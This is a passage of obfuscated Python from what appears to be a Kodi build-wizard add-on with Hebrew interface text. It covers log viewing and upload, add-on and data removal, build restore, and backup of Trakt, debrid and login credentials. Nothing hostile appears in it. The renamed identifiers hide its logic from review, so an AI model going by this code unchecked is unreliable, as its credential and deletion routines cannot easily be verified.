ACTION_MOUSE_LONG_CLICK =108 #line:4956
def LogViewer (default =None ):#line:4958
	class OO0O0O00OOOOO00O0 (xbmcgui .WindowXMLDialog ):#line:4959
		def __init__ (O0000OO00OO0O0OO0 ,*O00OO0O000O00O0OO ,**O0OO0O0000OO0OOOO ):#line:4960
			O0000OO00OO0O0OO0 .default =O0OO0O0000OO0OOOO ['default']#line:4961
		def onInit (OOOOO0O0O0OO0O0O0 ):#line:4963
			OOOOO0O0O0OO0O0O0 .title =101 #line:4964
			OOOOO0O0O0OO0O0O0 .msg =102 #line:4965
			OOOOO0O0O0OO0O0O0 .scrollbar =103 #line:4966
			OOOOO0O0O0OO0O0O0 .upload =201 #line:4967
			OOOOO0O0O0OO0O0O0 .kodi =202 #line:4968
			OOOOO0O0O0OO0O0O0 .kodiold =203 #line:4969
			OOOOO0O0O0OO0O0O0 .wizard =204 #line:4970
			OOOOO0O0O0OO0O0O0 .okbutton =205 #line:4971
			OO0O000O00OO0000O =open (OOOOO0O0O0OO0O0O0 .default ,'r')#line:4972
			OOOOO0O0O0OO0O0O0 .logmsg =OO0O000O00OO0000O .read ()#line:4973
			OO0O000O00OO0000O .close ()#line:4974
			OOOOO0O0O0OO0O0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOOO0O0O0OO0O0O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4975
			OOOOO0O0O0OO0O0O0 .showdialog ()#line:4976
		def showdialog (OOOO0O00O00OOOOO0 ):#line:4978
			OOOO0O00O00OOOOO0 .getControl (OOOO0O00O00OOOOO0 .title ).setLabel (OOOO0O00O00OOOOO0 .titlemsg )#line:4979
			OOOO0O00O00OOOOO0 .getControl (OOOO0O00O00OOOOO0 .msg ).setText (wiz .highlightText (OOOO0O00O00OOOOO0 .logmsg ))#line:4980
			OOOO0O00O00OOOOO0 .setFocusId (OOOO0O00O00OOOOO0 .scrollbar )#line:4981
		def onClick (OOOOOO00O0OOOO0O0 ,OO0OO0O00OO000O00 ):#line:4983
			if OO0OO0O00OO000O00 ==OOOOOO00O0OOOO0O0 .okbutton :OOOOOO00O0OOOO0O0 .close ()#line:4984
			elif OO0OO0O00OO000O00 ==OOOOOO00O0OOOO0O0 .upload :OOOOOO00O0OOOO0O0 .close ();uploadLog .Main ()#line:4985
			elif OO0OO0O00OO000O00 ==OOOOOO00O0OOOO0O0 .kodi :#line:4986
				OO0O0O0OO0000OO00 =wiz .Grab_Log (False )#line:4987
				OOOOOOOOOO0OO00O0 =wiz .Grab_Log (True )#line:4988
				if OO0O0O0OO0000OO00 ==False :#line:4989
					OOOOOO00O0OOOO0O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4990
					OOOOOO00O0OOOO0O0 .getControl (OOOOOO00O0OOOO0O0 .msg ).setText ("Log File Does Not Exists!")#line:4991
				else :#line:4992
					OOOOOO00O0OOOO0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOOOOOOOO0OO00O0 .replace (LOG ,''))#line:4993
					OOOOOO00O0OOOO0O0 .getControl (OOOOOO00O0OOOO0O0 .title ).setLabel (OOOOOO00O0OOOO0O0 .titlemsg )#line:4994
					OOOOOO00O0OOOO0O0 .getControl (OOOOOO00O0OOOO0O0 .msg ).setText (wiz .highlightText (OO0O0O0OO0000OO00 ))#line:4995
					OOOOOO00O0OOOO0O0 .setFocusId (OOOOOO00O0OOOO0O0 .scrollbar )#line:4996
			elif OO0OO0O00OO000O00 ==OOOOOO00O0OOOO0O0 .kodiold :#line:4997
				OO0O0O0OO0000OO00 =wiz .Grab_Log (False ,True )#line:4998
				OOOOOOOOOO0OO00O0 =wiz .Grab_Log (True ,True )#line:4999
				if OO0O0O0OO0000OO00 ==False :#line:5000
					OOOOOO00O0OOOO0O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5001
					OOOOOO00O0OOOO0O0 .getControl (OOOOOO00O0OOOO0O0 .msg ).setText ("Log File Does Not Exists!")#line:5002
				else :#line:5003
					OOOOOO00O0OOOO0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOOOOOOOO0OO00O0 .replace (LOG ,''))#line:5004
					OOOOOO00O0OOOO0O0 .getControl (OOOOOO00O0OOOO0O0 .title ).setLabel (OOOOOO00O0OOOO0O0 .titlemsg )#line:5005
					OOOOOO00O0OOOO0O0 .getControl (OOOOOO00O0OOOO0O0 .msg ).setText (wiz .highlightText (OO0O0O0OO0000OO00 ))#line:5006
					OOOOOO00O0OOOO0O0 .setFocusId (OOOOOO00O0OOOO0O0 .scrollbar )#line:5007
			elif OO0OO0O00OO000O00 ==OOOOOO00O0OOOO0O0 .wizard :#line:5008
				OO0O0O0OO0000OO00 =wiz .Grab_Log (False ,False ,True )#line:5009
				OOOOOOOOOO0OO00O0 =wiz .Grab_Log (True ,False ,True )#line:5010
				if OO0O0O0OO0000OO00 ==False :#line:5011
					OOOOOO00O0OOOO0O0 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5012
					OOOOOO00O0OOOO0O0 .getControl (OOOOOO00O0OOOO0O0 .msg ).setText ("Log File Does Not Exists!")#line:5013
				else :#line:5014
					OOOOOO00O0OOOO0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOOOOOOOO0OO00O0 .replace (ADDONDATA ,''))#line:5015
					OOOOOO00O0OOOO0O0 .getControl (OOOOOO00O0OOOO0O0 .title ).setLabel (OOOOOO00O0OOOO0O0 .titlemsg )#line:5016
					OOOOOO00O0OOOO0O0 .getControl (OOOOOO00O0OOOO0O0 .msg ).setText (wiz .highlightText (OO0O0O0OO0000OO00 ))#line:5017
					OOOOOO00O0OOOO0O0 .setFocusId (OOOOOO00O0OOOO0O0 .scrollbar )#line:5018
		def onAction (OO00OOOOO0OOO0OOO ,O0000OO0O0O0OO0O0 ):#line:5020
			if O0000OO0O0O0OO0O0 ==ACTION_PREVIOUS_MENU :OO00OOOOO0OOO0OOO .close ()#line:5021
			elif O0000OO0O0O0OO0O0 ==ACTION_NAV_BACK :OO00OOOOO0OOO0OOO .close ()#line:5022
	if default ==None :default =wiz .Grab_Log (True )#line:5023
	OO0OOOO0O000OOOOO =OO0O0O00OOOOO00O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:5024
	OO0OOOO0O000OOOOO .doModal ()#line:5025
	del OO0OOOO0O000OOOOO #line:5026
def removeAddon (OOOOOO0O0OOO0O00O ,OOO00O0O00000O000 ,over =False ):#line:5028
	if not over ==False :#line:5029
		OO000O0OOOO0O0OOO =1 #line:5030
	else :#line:5031
		OO000O0OOOO0O0OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO00O0O00000O000 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOOOOO0O0OOO0O00O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:5032
	if OO000O0OOOO0O0OOO ==1 :#line:5033
		OO0OOO0OO0O000O00 =os .path .join (ADDONS ,OOOOOO0O0OOO0O00O )#line:5034
		wiz .log ("Removing Addon %s"%OOOOOO0O0OOO0O00O )#line:5035
		wiz .cleanHouse (OO0OOO0OO0O000O00 )#line:5036
		xbmc .sleep (1000 )#line:5037
		try :shutil .rmtree (OO0OOO0OO0O000O00 )#line:5038
		except Exception as OO0O00000OOOO00OO :wiz .log ("Error removing %s"%OOOOOO0O0OOO0O00O ,xbmc .LOGNOTICE )#line:5039
		removeAddonData (OOOOOO0O0OOO0O00O ,OOO00O0O00000O000 ,over )#line:5040
	if over ==False :#line:5041
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OOO00O0O00000O000 ))#line:5042
def removeAddonData (O0O00O00O00OO0OOO ,name =None ,over =False ):#line:5044
	if O0O00O00O00OO0OOO =='all':#line:5045
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5046
			wiz .cleanHouse (ADDOND )#line:5047
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5048
	elif O0O00O00O00OO0OOO =='uninstalled':#line:5049
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5050
			O0OOO0OOO00OOOO00 =0 #line:5051
			for OO0OOOO00OOOO0O0O in glob .glob (os .path .join (ADDOND ,'*')):#line:5052
				OOOOOO0O00OO0OOOO =OO0OOOO00OOOO0O0O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:5053
				if OOOOOO0O00OO0OOOO in EXCLUDES :pass #line:5054
				elif os .path .exists (os .path .join (ADDONS ,OOOOOO0O00OO0OOOO )):pass #line:5055
				else :wiz .cleanHouse (OO0OOOO00OOOO0O0O );O0OOO0OOO00OOOO00 +=1 ;wiz .log (OO0OOOO00OOOO0O0O );shutil .rmtree (OO0OOOO00OOOO0O0O )#line:5056
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OOO0OOO00OOOO00 ))#line:5057
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5058
	elif O0O00O00O00OO0OOO =='empty':#line:5059
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5060
			O0OOO0OOO00OOOO00 =wiz .emptyfolder (ADDOND )#line:5061
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OOO0OOO00OOOO00 ))#line:5062
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5063
	else :#line:5064
		O0O00OO0O0O000000 =os .path .join (USERDATA ,'addon_data',O0O00O00O00OO0OOO )#line:5065
		if O0O00O00O00OO0OOO in EXCLUDES :#line:5066
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:5067
		elif os .path .exists (O0O00OO0O0O000000 ):#line:5068
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O00O00O00OO0OOO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5069
				wiz .cleanHouse (O0O00OO0O0O000000 )#line:5070
				try :#line:5071
					shutil .rmtree (O0O00OO0O0O000000 )#line:5072
				except :#line:5073
					wiz .log ("Error deleting: %s"%O0O00OO0O0O000000 )#line:5074
			else :#line:5075
				wiz .log ('Addon data for %s was not removed'%O0O00O00O00OO0OOO )#line:5076
	wiz .refresh ()#line:5077
def restoreit (O00000OOOO0000OO0 ):#line:5079
	if O00000OOOO0000OO0 =='build':#line:5080
		O000O0OOO00O000O0 =freshStart ('restore')#line:5081
		if O000O0OOO00O000O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:5082
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:5083
		wiz .skinToDefault ()#line:5084
	wiz .restoreLocal (O00000OOOO0000OO0 )#line:5085
def restoreextit (O0000OOO00O0O0O00 ):#line:5087
	if O0000OOO00O0O0O00 =='build':#line:5088
		OOOO0O0OOO000O00O =freshStart ('restore')#line:5089
		if OOOO0O0OOO000O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:5090
	wiz .restoreExternal (O0000OOO00O0O0O00 )#line:5091
def buildInfo (O0OO0000OO00OOO0O ):#line:5093
	if wiz .workingURL (SPEEDFILE )==True :#line:5094
		if wiz .checkBuild (O0OO0000OO00OOO0O ,'url'):#line:5095
			O0OO0000OO00OOO0O ,O000OOO00O0OOO000 ,OO00OO0O0O000O0O0 ,O00O00OO0000O0O0O ,OOO0O0O0O00OO0OO0 ,O00O0000O00OO00OO ,O00O00O00O000O0O0 ,OO00OO0O0OOO00000 ,OO00O0OOOO0OO0OOO ,OO0000000OO00O0O0 ,OOO000OO00OOO0OOO =wiz .checkBuild (O0OO0000OO00OOO0O ,'all')#line:5096
			OO0000000OO00O0O0 ='Yes'if OO0000000OO00O0O0 .lower ()=='yes'else 'No'#line:5097
			OOO00OOOOOO00O000 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0000OO00OOO0O )#line:5098
			OOO00OOOOOO00O000 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000OOO00O0OOO000 )#line:5099
			if not O00O0000O00OO00OO =="http://":#line:5100
				O000O00O00OO000O0 =wiz .themeCount (O0OO0000OO00OOO0O ,False )#line:5101
				OOO00OOOOOO00O000 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O000O00O00OO000O0 ))#line:5102
			OOO00OOOOOO00O000 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0O0O0O00OO0OO0 )#line:5103
			OOO00OOOOOO00O000 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0000000OO00O0O0 )#line:5104
			OOO00OOOOOO00O000 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO000OO00OOO0OOO )#line:5105
			wiz .TextBox (ADDONTITLE ,OOO00OOOOOO00O000 )#line:5106
		else :wiz .log ("Invalid Build Name!")#line:5107
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5108
def buildVideo (O00O00000000OO000 ):#line:5110
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:5111
	if wiz .workingURL (SPEEDFILE )==True :#line:5112
		OOOO0OOO0O000O000 =wiz .checkBuild (O00O00000000OO000 ,'preview')#line:5113
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O00O00000000OO000 )#line:5114
		if OOOO0OOO0O000O000 and not OOOO0OOO0O000O000 =='http://':playVideo (OOOO0OOO0O000O000 )#line:5115
		else :wiz .log ("[%s]Unable to find url for video preview"%O00O00000000OO000 )#line:5116
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5117
def dependsList (O0OOOO0000OO00O0O ):#line:5119
	O00O0OO0OO0O000OO =os .path .join (ADDONS ,O0OOOO0000OO00O0O ,'addon.xml')#line:5120
	if os .path .exists (O00O0OO0OO0O000OO ):#line:5121
		O000000O00OO00O0O =open (O00O0OO0OO0O000OO ,mode ='r');O0OOOOO0OOO0O00O0 =O000000O00OO00O0O .read ();O000000O00OO00O0O .close ();#line:5122
		OOO000OOO0O00OOOO =wiz .parseDOM (O0OOOOO0OOO0O00O0 ,'import',ret ='addon')#line:5123
		O000000000000O0OO =[]#line:5124
		for OOOO000O0OOO00000 in OOO000OOO0O00OOOO :#line:5125
			if not 'xbmc.python'in OOOO000O0OOO00000 :#line:5126
				O000000000000O0OO .append (OOOO000O0OOO00000 )#line:5127
		return O000000000000O0OO #line:5128
	return []#line:5129
def manageSaveData (OO0O00OO000O0OO00 ):#line:5131
	if OO0O00OO000O0OO00 =='import':#line:5132
		OOOO0O00OO0000O0O =os .path .join (ADDONDATA ,'temp')#line:5133
		if not os .path .exists (OOOO0O00OO0000O0O ):os .makedirs (OOOO0O00OO0000O0O )#line:5134
		O0OO00OO00OOO000O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:5135
		if not O0OO00OO00OOO000O .endswith ('.zip'):#line:5136
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:5137
			return #line:5138
		O00O00O000OO00OO0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:5139
		O00000OOOO000OO00 =xbmcvfs .copy (O0OO00OO00OOO000O ,O00O00O000OO00OO0 )#line:5140
		wiz .log ("%s"%str (O00000OOOO000OO00 ))#line:5141
		extract .all (xbmc .translatePath (O00O00O000OO00OO0 ),OOOO0O00OO0000O0O )#line:5142
		OO00O0O00O0O000OO =os .path .join (OOOO0O00OO0000O0O ,'trakt')#line:5143
		O00OO0OO00000O000 =os .path .join (OOOO0O00OO0000O0O ,'login')#line:5144
		OO0000OOOOO0OOOO0 =os .path .join (OOOO0O00OO0000O0O ,'debrid')#line:5145
		OO0OO0OO00O000OO0 =0 #line:5146
		if os .path .exists (OO00O0O00O0O000OO ):#line:5147
			OO0OO0OO00O000OO0 +=1 #line:5148
			OOO0O0OOO000OOOOO =os .listdir (OO00O0O00O0O000OO )#line:5149
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:5150
			for O00O00OOOO00O0O0O in OOO0O0OOO000OOOOO :#line:5151
				O00OO00OO00OOOO0O =os .path .join (traktit .TRAKTFOLD ,O00O00OOOO00O0O0O )#line:5152
				OO00OOOO00O00O00O =os .path .join (OO00O0O00O0O000OO ,O00O00OOOO00O0O0O )#line:5153
				if os .path .exists (O00OO00OO00OOOO0O ):#line:5154
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O00OOOO00O0O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5155
					else :os .remove (O00OO00OO00OOOO0O )#line:5156
				shutil .copy (OO00OOOO00O00O00O ,O00OO00OO00OOOO0O )#line:5157
			traktit .importlist ('all')#line:5158
			traktit .traktIt ('restore','all')#line:5159
		if os .path .exists (O00OO0OO00000O000 ):#line:5160
			OO0OO0OO00O000OO0 +=1 #line:5161
			OOO0O0OOO000OOOOO =os .listdir (O00OO0OO00000O000 )#line:5162
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:5163
			for O00O00OOOO00O0O0O in OOO0O0OOO000OOOOO :#line:5164
				O00OO00OO00OOOO0O =os .path .join (loginit .LOGINFOLD ,O00O00OOOO00O0O0O )#line:5165
				OO00OOOO00O00O00O =os .path .join (O00OO0OO00000O000 ,O00O00OOOO00O0O0O )#line:5166
				if os .path .exists (O00OO00OO00OOOO0O ):#line:5167
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O00OOOO00O0O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5168
					else :os .remove (O00OO00OO00OOOO0O )#line:5169
				shutil .copy (OO00OOOO00O00O00O ,O00OO00OO00OOOO0O )#line:5170
			loginit .importlist ('all')#line:5171
			loginit .loginIt ('restore','all')#line:5172
		if os .path .exists (OO0000OOOOO0OOOO0 ):#line:5173
			OO0OO0OO00O000OO0 +=1 #line:5174
			OOO0O0OOO000OOOOO =os .listdir (OO0000OOOOO0OOOO0 )#line:5175
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:5176
			for O00O00OOOO00O0O0O in OOO0O0OOO000OOOOO :#line:5177
				O00OO00OO00OOOO0O =os .path .join (debridit .REALFOLD ,O00O00OOOO00O0O0O )#line:5178
				OO00OOOO00O00O00O =os .path .join (OO0000OOOOO0OOOO0 ,O00O00OOOO00O0O0O )#line:5179
				if os .path .exists (O00OO00OO00OOOO0O ):#line:5180
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O00O00OOOO00O0O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5181
					else :os .remove (O00OO00OO00OOOO0O )#line:5182
				shutil .copy (OO00OOOO00O00O00O ,O00OO00OO00OOOO0O )#line:5183
			debridit .importlist ('all')#line:5184
			debridit .debridIt ('restore','all')#line:5185
		wiz .cleanHouse (OOOO0O00OO0000O0O )#line:5186
		wiz .removeFolder (OOOO0O00OO0000O0O )#line:5187
		os .remove (O00O00O000OO00OO0 )#line:5188
		if OO0OO0OO00O000OO0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:5189
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:5190
	elif OO0O00OO000O0OO00 =='export':#line:5191
		O0O0OO000OOO0OO00 =xbmc .translatePath (MYBUILDS )#line:5192
		OOOOO00OO0000OOOO =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:5193
		traktit .traktIt ('update','all')#line:5194
		loginit .loginIt ('update','all')#line:5195
		debridit .debridIt ('update','all')#line:5196
		O0OO00OO00OOO000O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:5197
		O0OO00OO00OOO000O =xbmc .translatePath (O0OO00OO00OOO000O )#line:5198
		O0000OOO0O0O00000 =os .path .join (O0O0OO000OOO0OO00 ,'SaveData.zip')#line:5199
		OO000OO0O0O00OO0O =zipfile .ZipFile (O0000OOO0O0O00000 ,mode ='w')#line:5200
		for OO00OOO000OO0OO00 in OOOOO00OO0000OOOO :#line:5201
			if os .path .exists (OO00OOO000OO0OO00 ):#line:5202
				OOO0O0OOO000OOOOO =os .listdir (OO00OOO000OO0OO00 )#line:5203
				for O0OOO0O00O0OOO00O in OOO0O0OOO000OOOOO :#line:5204
					OO000OO0O0O00OO0O .write (os .path .join (OO00OOO000OO0OO00 ,O0OOO0O00O0OOO00O ),os .path .join (OO00OOO000OO0OO00 ,O0OOO0O00O0OOO00O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:5205
		OO000OO0O0O00OO0O .close ()#line:5206
		if O0OO00OO00OOO000O ==O0O0OO000OOO0OO00 :#line:5207
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OOO0O0O00000 ))#line:5208
		else :#line:5209
			try :#line:5210
				xbmcvfs .copy (O0000OOO0O0O00000 ,os .path .join (O0OO00OO00OOO000O ,'SaveData.zip'))#line:5211
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OO00OO00OOO000O ,'SaveData.zip')))#line:5212
			except :#line:5213
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OOO0O0O00000 ))#line:5214
def freshStart (install =None ,over =False ):#line:5219
	if USERNAME =='':#line:5220
		ADDON .openSettings ()#line:5221
		sys .exit ()#line:5222
	OOO0O000OOO00O000 =(SPEEDFILE )#line:5223
	(OOO0O000OOO00O000 )#line:5224
	OOO00OO0O0O000000 =(wiz .workingURL (OOO0O000OOO00O000 ))#line:5225
	(OOO00OO0O0O000000 )#line:5226
	if KEEPTRAKT =='true':#line:5227
		traktit .autoUpdate ('all')#line:5228
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:5229
	if KEEPREAL =='true':#line:5230
		debridit .autoUpdate ('all')#line:5231
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:5232
	if KEEPLOGIN =='true':#line:5233
		loginit .autoUpdate ('all')#line:5234
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:5235
	if over ==True :O0O0OO000O0OOO0OO =1 #line:5236
	elif install =='restore':O0O0OO000O0OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5237
	elif install :O0O0OO000O0OOO0OO =1 #line:5238
	else :O0O0OO000O0OOO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5239
	if O0O0OO000O0OOO0OO :#line:5240
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5241
			OO0OOO0O0OOO0O000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:5242
			skinSwitch .swapSkins (OO0OOO0O0OOO0O000 )#line:5245
			O0O0O00OOOOO0000O =0 #line:5246
			xbmc .sleep (1000 )#line:5247
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O00OOOOO0000O <150 :#line:5248
				O0O0O00OOOOO0000O +=1 #line:5249
				xbmc .sleep (1000 )#line:5250
				wiz .ebi ('SendAction(Select)')#line:5251
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:5252
				wiz .ebi ('SendClick(11)')#line:5253
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:5254
			xbmc .sleep (1000 )#line:5255
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5256
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:5257
			return #line:5258
		wiz .addonUpdates ('set')#line:5259
		OO0000000O000000O =os .path .abspath (HOME )#line:5260
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:5261
		OO0O000OOO00O0OO0 =sum ([len (OOO00000O00O00OO0 )for OOO00OO00000OOOO0 ,OOO00O00OO0OOO0O0 ,OOO00000O00O00OO0 in os .walk (OO0000000O000000O )]);OOOOO0O0000O00000 =0 #line:5262
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:5263
		EXCLUDES .append ('My_Builds')#line:5264
		EXCLUDES .append ('archive_cache')#line:5265
		EXCLUDES .append ('script.module.requests')#line:5266
		EXCLUDES .append ('myfav.anon')#line:5267
		if KEEPREPOS =='true':#line:5268
			O0OOOO0OOOO0O00O0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:5269
			for OO0OOO00O00O00OO0 in O0OOOO0OOOO0O00O0 :#line:5270
				OO000OO00OOO0O000 =os .path .split (OO0OOO00O00O00OO0 [:-1 ])[1 ]#line:5271
				if not OO000OO00OOO0O000 ==EXCLUDES :#line:5272
					EXCLUDES .append (OO000OO00OOO0O000 )#line:5273
		if KEEPSUPER =='true':#line:5274
			EXCLUDES .append ('plugin.program.super.favourites')#line:5275
		if KEEPMOVIELIST =='true':#line:5276
			EXCLUDES .append ('plugin.video.metalliq')#line:5277
		if KEEPMOVIELIST =='true':#line:5278
